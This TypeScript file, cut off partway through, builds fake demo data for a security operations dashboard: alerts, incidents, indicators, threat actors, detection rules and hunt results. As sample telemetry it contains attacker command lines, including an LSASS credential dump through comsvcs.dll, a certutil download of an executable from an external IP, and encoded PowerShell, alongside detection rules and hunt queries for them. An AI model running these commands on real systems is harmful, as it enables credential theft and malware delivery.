/**
 * Centralized seeded demo dataset for SentinelOps.
 *
 * IMPORTANT: this is the ONLY place fake data exists. Pages never import it
 * directly — they consume the service layer in `src/services/index.ts`, which
 * routes to the real FastAPI client when VITE_API_BASE_URL is configured.
 *
 * All values are deterministic (seeded PRNG) and built lazily, never at module
 * scope, so SSR/worker runtimes stay happy.
 */
import type {
  AlertEvent,
  AlertStatus,
  Asset,
  AuditLog,
  DashboardMetrics,
  DetectionRule,
  Evidence,
  HuntResult,
  Incident,
  IncidentStatus,
  InvestigationCase,
  Ioc,
  IocType,
  NoteEntry,
  NotificationItem,
  ReportItem,
  SavedHunt,
  Session,
  Severity,
  ThreatActor,
  ThreatFeed,
  TimelineEntry,
  User,
  AdminStats,
} from "./types";

function mulberry32(seed: number) {
  let a = seed;
  return () => {
    a |= 0;
    a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const ANALYSTS = [
  "A. Tyagi",
  "V. Vashistha",
  "M. Chen",
  "R. Okafor",
  "L. Petrova",
  "S. Nakamura",
  "D. Hoffman",
];

const HOSTS = [
  "WIN-DC01",
  "WIN-DC02",
  "SRV-SQL-PROD-03",
  "SRV-WEB-EDGE-01",
  "K8S-NODE-07",
  "FIN-WKS-2214",
  "HR-WKS-1108",
  "ENG-MBP-0442",
  "SRV-FILE-02",
  "VPN-GW-01",
  "SRV-EXCH-01",
  "OPS-WKS-3391",
];

const USERS_SAM = [
  "svc_backup",
  "j.doe",
  "a.tyagi",
  "m.chen",
  "administrator",
  "r.okafor",
  "svc_sql",
  "l.petrova",
  "guest",
];

const MITRE: [string, string, string][] = [
  ["T1059.001", "PowerShell", "Execution"],
  ["T1055", "Process Injection", "Defense Evasion"],
  ["T1110.003", "Password Spraying", "Credential Access"],
  ["T1486", "Data Encrypted for Impact", "Impact"],
  ["T1071.001", "Web Protocols C2", "Command and Control"],
  ["T1021.001", "Remote Desktop Protocol", "Lateral Movement"],
  ["T1547.001", "Registry Run Keys", "Persistence"],
  ["T1003.001", "LSASS Memory Dump", "Credential Access"],
  ["T1566.001", "Spearphishing Attachment", "Initial Access"],
  ["T1567.002", "Exfiltration to Cloud Storage", "Exfiltration"],
  ["T1053.005", "Scheduled Task", "Persistence"],
  ["T1078.004", "Cloud Accounts", "Privilege Escalation"],
];

const RULES: [string, string, Severity][] = [
  ["Encoded PowerShell Command Execution", "DR-1042", "high"],
  ["LSASS Credential Dumping via comsvcs.dll", "DR-1007", "critical"],
  ["Mass File Encryption Behaviour", "DR-1099", "critical"],
  ["Impossible Travel Sign-in", "DR-2031", "high"],
  ["Password Spray Against Azure AD", "DR-2010", "high"],
  ["Suspicious Outbound Beaconing", "DR-3055", "medium"],
  ["New Service Installed on Domain Controller", "DR-1120", "high"],
  ["Registry Run Key Persistence", "DR-1130", "medium"],
  ["Malicious Attachment Detonated", "DR-4001", "critical"],
  ["Anomalous Data Transfer to External Storage", "DR-3070", "medium"],
  ["RDP Brute Force Attempt", "DR-2044", "medium"],
  ["Disabled Windows Defender Real-Time Protection", "DR-1145", "high"],
  ["Unusual Scheduled Task Creation", "DR-1150", "low"],
  ["Kerberoasting Activity Detected", "DR-1080", "high"],
];

const COUNTRIES = ["RU", "CN", "IR", "KP", "BR", "NL", "US", "IN", "DE", "VN"];

const SEVERITIES: Severity[] = ["critical", "high", "medium", "low"];

function pick<T>(rng: () => number, arr: T[]): T {
  return arr[Math.floor(rng() * arr.length)]!;
}

function ip(rng: () => number, external = true) {
  if (external) {
    return `${45 + Math.floor(rng() * 180)}.${Math.floor(rng() * 255)}.${Math.floor(
      rng() * 255,
    )}.${1 + Math.floor(rng() * 254)}`;
  }
  return `10.${Math.floor(rng() * 12)}.${Math.floor(rng() * 255)}.${1 + Math.floor(rng() * 254)}`;
}

function hex(rng: () => number, len: number) {
  let s = "";
  for (let i = 0; i < len; i++) s += "0123456789abcdef"[Math.floor(rng() * 16)];
  return s;
}

function iso(base: number, minutesAgo: number) {
  return new Date(base - minutesAgo * 60_000).toISOString();
}

export interface DemoDataset {
  generatedAt: string;
  users: User[];
  sessions: Session[];
  alerts: AlertEvent[];
  incidents: Incident[];
  cases: InvestigationCase[];
  iocs: Ioc[];
  feeds: ThreatFeed[];
  actors: ThreatActor[];
  assets: Asset[];
  rules: DetectionRule[];
  hunts: SavedHunt[];
  huntResults: HuntResult[];
  notifications: NotificationItem[];
  auditLogs: AuditLog[];
  reports: ReportItem[];
  metrics: DashboardMetrics;
  adminStats: AdminStats;
}

let cache: DemoDataset | null = null;

export function getDemoDataset(): DemoDataset {
  if (cache) return cache;
  cache = buildDataset();
  return cache;
}

/** Used by the realtime simulator to append generated records. */
export function mutateDataset(fn: (d: DemoDataset) => void) {
  const d = getDemoDataset();
  fn(d);
}

function buildDataset(): DemoDataset {
  const rng = mulberry32(20260819);
  // Round to the hour so SSR and client hydration agree closely.
  const base = Math.floor(Date.now() / 60_000) * 60_000;

  const notes = (n: number, offset: number): NoteEntry[] =>
    Array.from({ length: n }, (_, i) => ({
      id: `note-${offset}-${i}`,
      author: pick(rng, ANALYSTS),
      body: pick(rng, [
        "Confirmed the parent process is a legitimate deployment agent; continuing to monitor.",
        "Endpoint isolated via EDR. Awaiting memory capture before remediation.",
        "Correlated with three prior detections on the same subnet — likely the same operator.",
        "Requested log pull from the identity provider for the affected principal.",
        "User confirmed they did not initiate this activity. Escalating to L2.",
        "Hash submitted to intel platform; 41/68 engines flag it as a loader.",
      ]),
      createdAt: iso(base, 30 + i * 47 + offset),
    }));

  const timeline = (n: number, offset: number): TimelineEntry[] =>
    Array.from({ length: n }, (_, i) => ({
      id: `tl-${offset}-${i}`,
      at: iso(base, 400 - i * 55 + offset),
      actor: i === 0 ? "Detection Engine" : pick(rng, ANALYSTS),
      action: pick(rng, [
        "Detection triggered",
        "Alert triaged",
        "Assigned to analyst",
        "Evidence collected",
        "Host isolated",
        "Containment applied",
        "Escalated to incident",
        "Status updated",
      ]),
      detail: pick(rng, [
        "Automated enrichment added 4 intel matches.",
        "EDR telemetry attached to the case file.",
        "Playbook SOC-IR-014 executed successfully.",
        "Firewall block pushed to perimeter policy.",
      ]),
      severity: pick(rng, SEVERITIES),
    }));

  const evidence = (n: number, offset: number): Evidence[] =>
    Array.from({ length: n }, (_, i) => ({
      id: `ev-${offset}-${i}`,
      name: pick(rng, [
        "memory-dump.raw",
        "powershell-transcript.txt",
        "netflow-export.pcap",
        "sysmon-events.evtx",
        "malicious-payload.bin",
        "browser-history.sqlite",
      ]),
      type: pick(rng, ["Memory", "Log", "Network", "File", "Registry"]),
      hash: hex(rng, 64),
      collectedAt: iso(base, 120 + i * 33 + offset),
      collectedBy: pick(rng, ANALYSTS),
    }));

  /* ---------------------------------------------------------------- users */
  const roles = ["Administrator", "SOC Manager", "SOC Analyst L2", "SOC Analyst L1"] as const;
  const users: User[] = [
    {
      id: "usr-0001",
      name: "Vansh Vashistha",
      email: "vanshvashistha44657@gmail.com",
      role: "Administrator",
      status: "active",
      lastLogin: iso(base, 12),
      createdAt: iso(base, 400000),
      mfaEnabled: true,
    },
    {
      id: "usr-0002",
      name: "Ashish Tyagi",
      email: "a.tyagi@sentinelops.io",
      role: "SOC Manager",
      status: "active",
      lastLogin: iso(base, 55),
      createdAt: iso(base, 380000),
      mfaEnabled: true,
    },
    {
      id: "usr-0003",
      name: "Mei Chen",
      email: "m.chen@sentinelops.io",
      role: "SOC Analyst L2",
      status: "active",
      lastLogin: iso(base, 8),
      createdAt: iso(base, 240000),
      mfaEnabled: true,
    },
    {
      id: "usr-0004",
      name: "Rita Okafor",
      email: "r.okafor@sentinelops.io",
      role: "SOC Analyst L2",
      status: "active",
      lastLogin: iso(base, 190),
      createdAt: iso(base, 200000),
      mfaEnabled: false,
    },
    {
      id: "usr-0005",
      name: "Lena Petrova",
      email: "l.petrova@sentinelops.io",
      role: "SOC Analyst L1",
      status: "active",
      lastLogin: iso(base, 25),
      createdAt: iso(base, 90000),
      mfaEnabled: true,
    },
    {
      id: "usr-0006",
      name: "Sora Nakamura",
      email: "s.nakamura@sentinelops.io",
      role: "SOC Analyst L1",
      status: "disabled",
      lastLogin: iso(base, 20000),
      createdAt: iso(base, 150000),
      mfaEnabled: false,
    },
    {
      id: "usr-0007",
      name: "Daniel Hoffman",
      email: "d.hoffman@contoso.com",
      role: "SOC Analyst L1",
      status: "pending",
      lastLogin: null,
      createdAt: iso(base, 320),
      mfaEnabled: false,
    },
    {
      id: "usr-0008",
      name: "Priya Raman",
      email: "p.raman@contoso.com",
      role: "SOC Analyst L1",
      status: "pending",
      lastLogin: null,
      createdAt: iso(base, 900),
      mfaEnabled: false,
    },
    {
      id: "usr-0009",
      name: "Tomas Alvarez",
      email: "t.alvarez@contoso.com",
      role: "SOC Analyst L2",
      status: "pending",
      lastLogin: null,
      createdAt: iso(base, 2400),
      mfaEnabled: false,
    },
    {
      id: "usr-0010",
      name: "Ken Barlow",
      email: "k.barlow@external.net",
      role: "SOC Analyst L1",
      status: "rejected",
      lastLogin: null,
      createdAt: iso(base, 8600),
      mfaEnabled: false,
    },
  ];

  const sessions: Session[] = Array.from({ length: 7 }, (_, i) => ({
    id: `ses-${1000 + i}`,
    userId: users[i % users.length]!.id,
    device: pick(rng, [
      "Chrome 128 · Windows 11",
      "Firefox 130 · Ubuntu 24.04",
      "Safari 18 · macOS Sequoia",
      "Edge 128 · Windows 11",
    ]),
    ip: ip(rng, false),
    location: pick(rng, ["Delhi, IN", "Pune, IN", "Frankfurt, DE", "Austin, US", "Tokyo, JP"]),
    startedAt: iso(base, 60 + i * 120),
    lastActive: iso(base, i * 7),
    current: i === 0,
  }));

  /* --------------------------------------------------------------- alerts */
  const alertStatuses: AlertStatus[] = [
    "new",
    "new",
    "investigating",
    "escalated",
    "false_positive",
    "closed",
  ];
  const alerts: AlertEvent[] = Array.from({ length: 84 }, (_, i) => {
    const [ruleName, ruleId, ruleSev] = pick(rng, RULES);
    const [tech, techName, tactic] = pick(rng, MITRE);
    const severity: Severity = rng() > 0.72 ? ruleSev : pick(rng, SEVERITIES);
    const status = pick(rng, alertStatuses);
    const host = pick(rng, HOSTS);
    const src = ip(rng);
    const dst = ip(rng, false);
    const user = pick(rng, USERS_SAM);
    return {
      id: `ALT-${(48210 - i).toString()}`,
      title: ruleName,
      rule: ruleName,
      ruleId,
      severity,
      status,
      sourceIp: src,
      destinationIp: dst,
      host,
      user,
      mitreTechnique: tech,
      mitreName: techName,
      tactic,
      assignee: status === "new" ? null : pick(rng, ANALYSTS),
      timestamp: iso(base, 4 + i * 37 + Math.floor(rng() * 20)),
      description: `${ruleName} detected on ${host}. Principal ${user} initiated activity mapped to ${tech} (${techName}) during the ${tactic} phase.`,
      rawEvent: {
        event_id: 4688 + Math.floor(rng() * 20),
        provider: pick(rng, ["Microsoft-Windows-Sysmon", "EDR-Sensor", "Zeek", "Azure AD"]),
        process: pick(rng, [
          "powershell.exe",
          "rundll32.exe",
          "cmd.exe",
          "wmic.exe",
          "svchost.exe",
        ]),
        command_line: pick(rng, [
          "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
          'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 704 lsass.dmp full',
          "wmic process call create \"cmd /c whoami /all\"",
          "cmd.exe /c schtasks /create /tn UpdateSvc /tr C:\\Users\\Public\\svc.exe /sc minute",
        ]),
        parent_process: pick(rng, ["explorer.exe", "winword.exe", "services.exe", "outlook.exe"]),
        user,
        host,
        src_ip: src,
        dst_ip: dst,
        dst_port: pick(rng, [443, 445, 3389, 8080, 53]),
        hash_sha256: hex(rng, 64),
        detection_confidence: 0.6 + Math.round(rng() * 39) / 100,
      },
      relatedIncidentId: null,
      notes: notes(1 + Math.floor(rng() * 2), i),
      timeline: timeline(3 + Math.floor(rng() * 2), i),
      riskScore: 30 + Math.floor(rng() * 70),
    } satisfies AlertEvent;
  });

  /* ------------------------------------------------------------ incidents */
  const incStatuses: IncidentStatus[] = [
    "open",
    "investigating",
    "containment",
    "eradication",
    "resolved",
  ];
  const incidents: Incident[] = Array.from({ length: 18 }, (_, i) => {
    const severity = pick(rng, SEVERITIES);
    const status = pick(rng, incStatuses);
    const linked = alerts.slice(i * 3, i * 3 + 2 + Math.floor(rng() * 3));
    linked.forEach((a) => (a.relatedIncidentId = `INC-${2400 + i}`));
    return {
      id: `INC-${2400 + i}`,
      title: pick(rng, [
        "Ransomware staging detected on finance file server",
        "Credential harvesting campaign targeting engineering",
        "Domain controller persistence via new service",
        "Suspected data exfiltration to unsanctioned cloud storage",
        "Compromised VPN account with impossible travel",
        "Beaconing to known C2 infrastructure",
        "Privileged account abuse in production subscription",
        "Phishing payload executed on HR workstation",
      ]),
      severity,
      priority:
        severity === "critical" ? "P1" : severity === "high" ? "P2" : severity === "medium" ? "P3" : "P4",
      status,
      assignee: pick(rng, ANALYSTS),
      createdAt: iso(base, 200 + i * 340),
      updatedAt: iso(base, 20 + i * 60),
      affectedAssets: [pick(rng, HOSTS), pick(rng, HOSTS)],
      alertIds: linked.map((a) => a.id),
      caseIds: i % 3 === 0 ? [`CASE-${910 + Math.floor(i / 3)}`] : [],
      mitre: [pick(rng, MITRE)[0], pick(rng, MITRE)[0]],
      summary:
        "Multi-stage intrusion correlated from EDR, identity and network telemetry. Containment actions were executed per playbook SOC-IR-014 with continued monitoring on adjacent assets.",
      resolution:
        status === "resolved"
          ? "Root cause traced to a compromised service account. Credentials rotated, persistence removed, and detection coverage extended."
          : null,
      timeline: timeline(5, i * 3),
      notes: notes(2, i * 5),
      evidence: evidence(3, i),
    } satisfies Incident;
  });

  /* ---------------------------------------------------------------- cases */
  const cases: InvestigationCase[] = Array.from({ length: 12 }, (_, i) => ({
    id: `CASE-${910 + i}`,
    title: pick(rng, [
      "Investigation: ransomware precursor activity",
      "Investigation: insider data movement review",
      "Investigation: repeated authentication anomalies",
      "Investigation: supply chain package compromise",
      "Investigation: cloud privilege escalation review",
      "Investigation: business email compromise",
    ]),
    status: pick(rng, ["open", "in_progress", "pending_review", "closed"] as const),
    severity: pick(rng, SEVERITIES),
    owner: pick(rng, ANALYSTS),
    createdAt: iso(base, 500 + i * 700),
    updatedAt: iso(base, 30 + i * 90),
    summary:
      "Structured investigation tracking scope, containment status and evidence chain-of-custody across all correlated incidents and alerts.",
    tasks: [
      "Collect volatile memory from affected hosts",
      "Validate identity provider sign-in logs",
      "Confirm blast radius across adjacent subnets",
      "Rotate impacted service credentials",
      "Draft executive summary for stakeholders",
      "Close out with detection tuning recommendations",
    ].map((t, ti) => ({
      id: `task-${i}-${ti}`,
      title: t,
      done: rng() > 0.45,
      owner: pick(rng, ANALYSTS),
    })),
    incidentIds: [incidents[i % incidents.length]!.id],
    alertIds: alerts.slice(i * 2, i * 2 + 3).map((a) => a.id),
    evidence: evidence(2, 500 + i),
    notes: notes(2, 900 + i),
    timeline: timeline(4, i * 7),
    attachments: [
      { id: `att-${i}-1`, name: "forensic-report.pdf", size: "2.4 MB", addedAt: iso(base, 300 + i * 40) },
      { id: `att-${i}-2`, name: "ioc-export.csv", size: "18 KB", addedAt: iso(base, 220 + i * 40) },
    ],
  }));

  /* ----------------------------------------------------------------- IOCs */
  const iocTypes: IocType[] = ["ip", "domain", "url", "sha256", "md5", "email", "process", "registry_key"];
  const iocs: Ioc[] = Array.from({ length: 60 }, (_, i) => {
    const type = iocTypes[i % iocTypes.length]!;
    const value =
      type === "ip"
        ? ip(rng)
        : type === "domain"
          ? `${pick(rng, ["update", "cdn-sync", "secure-login", "mail-relay", "api-node"])}-${hex(rng, 4)}.${pick(rng, ["xyz", "top", "ru", "cc", "info"])}`
          : type === "url"
            ? `https://${hex(rng, 6)}.${pick(rng, ["xyz", "top", "cc"])}/${pick(rng, ["payload", "gate", "panel"])}.php`
            : type === "sha256"
              ? hex(rng, 64)
              : type === "md5"
                ? hex(rng, 32)
                : type === "email"
                  ? `${pick(rng, ["invoice", "hr-notice", "it-support"])}@${hex(rng, 5)}.com`
                  : type === "process"
                    ? pick(rng, ["svc-update.exe", "runtimebroker32.exe", "winlogonx.exe"])
                    : `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\${pick(rng, ["UpdateSvc", "SecHost", "OneDriveX"])}`;
    const risk = 20 + Math.floor(rng() * 80);
    return {
      id: `IOC-${7100 + i}`,
      type,
      value,
      riskScore: risk,
      severity: risk > 85 ? "critical" : risk > 65 ? "high" : risk > 45 ? "medium" : "low",
      tags: [pick(rng, ["ransomware", "c2", "phishing", "loader", "infostealer", "apt"]), pick(rng, ["active", "historic"])],
      source: pick(rng, ["MISP", "AlienVault OTX", "Internal Analysis", "Abuse.ch", "Recorded Future"]),
      firstSeen: iso(base, 4000 + i * 300),
      lastSeen: iso(base, 10 + i * 45),
      matches: Math.floor(rng() * 40),
      relatedAlertIds: alerts.slice(i, i + 2).map((a) => a.id),
      relatedIncidentIds: i % 4 === 0 ? [incidents[i % incidents.length]!.id] : [],
      description: "Indicator observed in correlated telemetry and enriched by configured intelligence sources.",
    } satisfies Ioc;
  });

  /* ---------------------------------------------------------------- intel */
  const feeds: ThreatFeed[] = [
    { id: "feed-1", name: "Abuse.ch URLhaus", provider: "abuse.ch", enabled: true, indicators: 148230, lastSync: iso(base, 12), reliability: "A" },
    { id: "feed-2", name: "AlienVault OTX", provider: "AT&T", enabled: true, indicators: 92184, lastSync: iso(base, 35), reliability: "B" },
    { id: "feed-3", name: "MISP Community", provider: "CIRCL", enabled: true, indicators: 61044, lastSync: iso(base, 90), reliability: "A" },
    { id: "feed-4", name: "Emerging Threats", provider: "Proofpoint", enabled: false, indicators: 33810, lastSync: iso(base, 2880), reliability: "B" },
    { id: "feed-5", name: "Internal Honeypot Grid", provider: "SentinelOps", enabled: true, indicators: 4820, lastSync: iso(base, 5), reliability: "A" },
  ];

  const actors: ThreatActor[] = [
    {
      id: "ta-1",
      name: "FIN7",
      aliases: ["Carbanak", "Carbon Spider"],
      origin: "Eastern Europe",
      motivation: "Financial",
      activity: 87,
      lastSeen: iso(base, 120),
      techniques: ["T1566.001", "T1059.001", "T1055"],
      targetSectors: ["Retail", "Finance", "Hospitality"],
      summary: "Financially motivated group leveraging spearphishing and custom backdoors against payment infrastructure.",
    },
    {
      id: "ta-2",
      name: "APT29",
      aliases: ["Cozy Bear", "Midnight Blizzard"],
      origin: "Russia",
      motivation: "Espionage",
      activity: 74,
      lastSeen: iso(base, 480),
      techniques: ["T1078.004", "T1071.001", "T1003.001"],
      targetSectors: ["Government", "Technology", "Research"],
      summary: "State-aligned espionage actor abusing cloud identity and stealthy C2 channels for long-dwell access.",
    },
    {
      id: "ta-3",
      name: "LockBit Affiliate 4",
      aliases: ["LB-A4"],
      origin: "Unknown",
      motivation: "Extortion",
      activity: 93,
      lastSeen: iso(base, 40),
      techniques: ["T1486", "T1021.001", "T1053.005"],
      targetSectors: ["Manufacturing", "Healthcare", "Education"],
      summary: "Ransomware affiliate performing rapid encryption after RDP-based lateral movement.",
    },
    {
      id: "ta-4",
      name: "Lazarus Group",
      aliases: ["Hidden Cobra"],
      origin: "DPRK",
      motivation: "Financial / Espionage",
      activity: 66,
      lastSeen: iso(base, 900),
      techniques: ["T1566.001", "T1567.002", "T1547.001"],
      targetSectors: ["Crypto", "Defense", "Media"],
      summary: "Dual-purpose actor combining currency theft with strategic intelligence collection.",
    },
  ];

  /* --------------------------------------------------------------- assets */
  const assets: Asset[] = HOSTS.concat(["AZ-STORAGE-PRD", "AWS-EKS-PROD", "SRV-BACKUP-01", "NET-CORE-SW1"]).map(
    (name, i) => {
      const type: Asset["type"] = name.startsWith("SRV") || name.startsWith("WIN-DC")
        ? "server"
        : name.startsWith("AZ") || name.startsWith("AWS")
          ? "cloud"
          : name.startsWith("NET") || name.startsWith("VPN")
            ? "network"
            : "endpoint";
      const risk = 15 + Math.floor(rng() * 85);
      return {
        id: `AST-${300 + i}`,
        name,
        type,
        os: type === "server" ? pick(rng, ["Windows Server 2022", "Windows Server 2019", "RHEL 9"]) : type === "cloud" ? "Linux (managed)" : pick(rng, ["Windows 11 23H2", "macOS 15", "Ubuntu 24.04"]),
        ip: ip(rng, false),
        owner: pick(rng, ["IT Infrastructure", "Finance", "Engineering", "HR", "Security"]),
        criticality: risk > 80 ? "critical" : risk > 60 ? "high" : risk > 35 ? "medium" : "low",
        riskScore: risk,
        patchStatus: pick(rng, ["up_to_date", "pending", "outdated"] as const),
        lastSeen: iso(base, Math.floor(rng() * 240)),
        software: [
          { name: "Microsoft Defender", version: "4.18.24", vulnerable: false },
          { name: "OpenSSL", version: pick(rng, ["3.0.13", "1.1.1t"]), vulnerable: rng() > 0.6 },
          { name: "Google Chrome", version: pick(rng, ["128.0", "122.0"]), vulnerable: rng() > 0.7 },
          { name: "7-Zip", version: "23.01", vulnerable: false },
        ],
        alertIds: alerts.filter((a) => a.host === name).slice(0, 4).map((a) => a.id),
        incidentIds: incidents.filter((inc) => inc.affectedAssets.includes(name)).map((inc) => inc.id),
        tags: [pick(rng, ["production", "pci", "gdpr", "internet-facing", "crown-jewel"])],
      } satisfies Asset;
    },
  );

  /* ------------------------------------------------------- detection rules */
  const rules: DetectionRule[] = RULES.map(([name, id, sev], i) => {
    const [tech, techName] = pick(rng, MITRE);
    return {
      id,
      name,
      description: `Detects ${name.toLowerCase()} by correlating process, identity and network telemetry within a 10 minute window.`,
      severity: sev,
      enabled: rng() > 0.15,
      mitre: tech,
      mitreName: techName,
      source: pick(rng, ["Sigma", "Custom", "Vendor", "MITRE"] as const),
      logic: `title: ${name}\nstatus: production\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith:\n      - '\\powershell.exe'\n      - '\\rundll32.exe'\n    CommandLine|contains:\n      - '-enc'\n      - 'MiniDump'\n  condition: selection\nfalsepositives:\n  - Administrative automation\nlevel: ${sev}`,
      lastTriggered: rng() > 0.1 ? iso(base, 20 + i * 130) : null,
      triggers30d: Math.floor(rng() * 240),
      falsePositiveRate: Math.round(rng() * 22),
      author: pick(rng, ANALYSTS),
      updatedAt: iso(base, 1000 + i * 800),
    } satisfies DetectionRule;
  });

  /* -------------------------------------------------------------- hunting */
  const hunts: SavedHunt[] = [
    { id: "hunt-1", name: "Encoded PowerShell across finance subnet", query: 'process.name:"powershell.exe" AND command_line:"-enc"', createdBy: "M. Chen", createdAt: iso(base, 5000), lastRun: iso(base, 90), results: 23 },
    { id: "hunt-2", name: "LSASS access by non-standard binaries", query: 'target_process:"lsass.exe" AND NOT process.signed:true', createdBy: "A. Tyagi", createdAt: iso(base, 12000), lastRun: iso(base, 400), results: 6 },
    { id: "hunt-3", name: "Outbound beacons with fixed jitter", query: "network.direction:outbound AND beacon.jitter<0.1", createdBy: "R. Okafor", createdAt: iso(base, 26000), lastRun: iso(base, 1500), results: 11 },
    { id: "hunt-4", name: "New admin accounts in last 7 days", query: 'event.code:4720 AND group:"Domain Admins"', createdBy: "L. Petrova", createdAt: iso(base, 40000), lastRun: iso(base, 3000), results: 2 },
  ];

  const huntResults: HuntResult[] = Array.from({ length: 46 }, (_, i) => {
    const [tech] = pick(rng, MITRE);
    return {
      id: `hr-${i}`,
      timestamp: iso(base, 20 + i * 61),
      host: pick(rng, HOSTS),
      user: pick(rng, USERS_SAM),
      process: pick(rng, ["powershell.exe", "rundll32.exe", "wmic.exe", "certutil.exe", "curl.exe"]),
      commandLine: pick(rng, [
        "powershell -nop -w hidden -enc SQBFAFgAIAA...",
        "certutil -urlcache -split -f http://45.83.12.9/a.exe",
        "rundll32 comsvcs.dll MiniDump 704 lsass.dmp full",
        "wmic /node:WIN-DC01 process call create cmd.exe",
      ]),
      sourceIp: ip(rng, false),
      destinationIp: ip(rng),
      mitre: tech,
      severity: pick(rng, SEVERITIES),
      matchedField: pick(rng, ["command_line", "dst_ip", "hash_sha256", "user", "process.name"]),
    } satisfies HuntResult;
  });

  /* -------------------------------------------------------- notifications */
  const notifications: NotificationItem[] = Array.from({ length: 22 }, (_, i) => {
    const category = pick(rng, [
      "critical_alert",
      "incident_assignment",
      "case_update",
      "ioc_match",
      "password_change",
      "admin_action",
      "system",
    ] as const);
    const map: Record<typeof category, { title: string; body: string; severity: Severity; link: string }> = {
      critical_alert: { title: "Critical alert triggered", body: `${pick(rng, RULES)[0]} on ${pick(rng, HOSTS)}`, severity: "critical", link: "/alerts" },
      incident_assignment: { title: "Incident assigned to you", body: `${incidents[i % incidents.length]!.id} — ${incidents[i % incidents.length]!.title}`, severity: "high", link: "/incidents" },
      case_update: { title: "Case updated", body: `${cases[i % cases.length]!.id} moved to review with 2 new evidence items`, severity: "medium", link: "/cases" },
      ioc_match: { title: "IOC match observed", body: `${iocs[i % iocs.length]!.value} matched egress traffic`, severity: "high", link: "/ioc" },
      password_change: { title: "Password changed", body: "Credential rotation completed for svc_backup", severity: "low", link: "/settings" },
      admin_action: { title: "Administrator action", body: "Role changed for r.okafor@sentinelops.io", severity: "medium", link: "/admin" },
      system: { title: "System warning", body: "Ingestion pipeline latency above threshold (820ms)", severity: "medium", link: "/admin" },
    };
    const m = map[category];
    return {
      id: `ntf-${i}`,
      title: m.title,
      body: m.body,
      severity: m.severity,
      category,
      read: i > 6,
      createdAt: iso(base, 3 + i * 41),
      link: m.link,
    } satisfies NotificationItem;
  });

  /* ------------------------------------------------------------ audit log */
  const auditLogs: AuditLog[] = Array.from({ length: 60 }, (_, i) => {
    const action = pick(rng, [
      "user.login",
      "user.logout",
      "user.approve",
      "user.reject",
      "role.update",
      "rule.enable",
      "rule.disable",
      "ioc.create",
      "incident.assign",
      "report.generate",
      "session.revoke",
      "settings.update",
    ]);
    return {
      id: `aud-${9000 + i}`,
      user: pick(rng, users).email,
      action,
      resource: pick(rng, ["users/usr-0005", "rules/DR-1042", "incidents/INC-2404", "iocs/IOC-7112", "system/config"]),
      timestamp: iso(base, 5 + i * 73),
      ip: ip(rng, false),
      previousValue: action.includes("update") || action.includes("role") ? pick(rng, ["SOC Analyst L1", "disabled", "false"]) : null,
      newValue: action.includes("update") || action.includes("role") ? pick(rng, ["SOC Analyst L2", "active", "true"]) : null,
      result: rng() > 0.08 ? "success" : "failure",
    } satisfies AuditLog;
  });

  /* -------------------------------------------------------------- reports */
  const reports: ReportItem[] = [
    { id: "rpt-1", name: "Daily SOC Report", type: "daily_soc", period: "Last 24 hours", generatedAt: iso(base, 120), generatedBy: "Automation", status: "ready", sizeKb: 412, summary: [{ label: "Alerts", value: "184" }, { label: "Incidents", value: "9" }, { label: "MTTR", value: "38m" }] },
    { id: "rpt-2", name: "Weekly SOC Report", type: "weekly_soc", period: "Last 7 days", generatedAt: iso(base, 2400), generatedBy: "A. Tyagi", status: "ready", sizeKb: 1180, summary: [{ label: "Alerts", value: "1,204" }, { label: "Incidents", value: "42" }, { label: "FP rate", value: "11%" }] },
    { id: "rpt-3", name: "Monthly SOC Report", type: "monthly_soc", period: "Last 30 days", generatedAt: iso(base, 14400), generatedBy: "A. Tyagi", status: "ready", sizeKb: 3260, summary: [{ label: "Alerts", value: "5,318" }, { label: "Incidents", value: "168" }, { label: "Score", value: "82" }] },
    { id: "rpt-4", name: "Incident Report — INC-2404", type: "incident", period: "Incident scoped", generatedAt: iso(base, 300), generatedBy: "M. Chen", status: "ready", sizeKb: 620, summary: [{ label: "Severity", value: "Critical" }, { label: "Assets", value: "6" }, { label: "Dwell", value: "4h 12m" }] },
    { id: "rpt-5", name: "SOC Metrics", type: "soc_metrics", period: "Quarter to date", generatedAt: iso(base, 900), generatedBy: "Automation", status: "ready", sizeKb: 540, summary: [{ label: "MTTD", value: "6m" }, { label: "MTTR", value: "41m" }, { label: "Coverage", value: "78%" }] },
    { id: "rpt-6", name: "Analyst Performance", type: "analyst_performance", period: "Last 30 days", generatedAt: iso(base, 1800), generatedBy: "A. Tyagi", status: "ready", sizeKb: 288, summary: [{ label: "Analysts", value: "7" }, { label: "Closed", value: "941" }, { label: "Avg TTR", value: "44m" }] },
    { id: "rpt-7", name: "False Positive Analysis", type: "false_positives", period: "Last 30 days", generatedAt: iso(base, 5400), generatedBy: "R. Okafor", status: "ready", sizeKb: 196, summary: [{ label: "FP", value: "148" }, { label: "Top rule", value: "DR-3055" }, { label: "Rate", value: "11.4%" }] },
  ];

  /* -------------------------------------------------------------- metrics */
  const alertVolume = Array.from({ length: 24 }, (_, h) => {
    const hour = (new Date(base).getUTCHours() - 23 + h + 24) % 24;
    return {
      time: `${hour.toString().padStart(2, "0")}:00`,
      critical: Math.floor(rng() * 6),
      high: 3 + Math.floor(rng() * 14),
      medium: 8 + Math.floor(rng() * 22),
      low: 12 + Math.floor(rng() * 30),
    };
  });

  const count = (s: Severity) => alerts.filter((a) => a.severity === s).length;

  const metrics: DashboardMetrics = {
    criticalAlerts: count("critical"),
    highAlerts: count("high"),
    openIncidents: incidents.filter((i) => i.status !== "resolved").length,
    activeCases: cases.filter((c) => c.status !== "closed").length,
    iocMatches: iocs.reduce((n, i) => n + i.matches, 0),
    intelMatches: 137,
    assetsAtRisk: assets.filter((a) => a.riskScore > 60).length,
    securityScore: 82,
    systemHealth: 98,
    mttrMinutes: 41,
    falsePositiveRate: 11.4,
    alertToIncident: 8.3,
    analystWorkload: ANALYSTS.slice(0, 6).map((a) => ({
      analyst: a,
      open: 2 + Math.floor(rng() * 12),
      capacity: 15,
    })),
    alertVolume,
    severityDistribution: SEVERITIES.map((s) => ({ name: s, value: count(s), severity: s })),
    mitreDistribution: MITRE.slice(0, 8).map(([t, n]) => ({
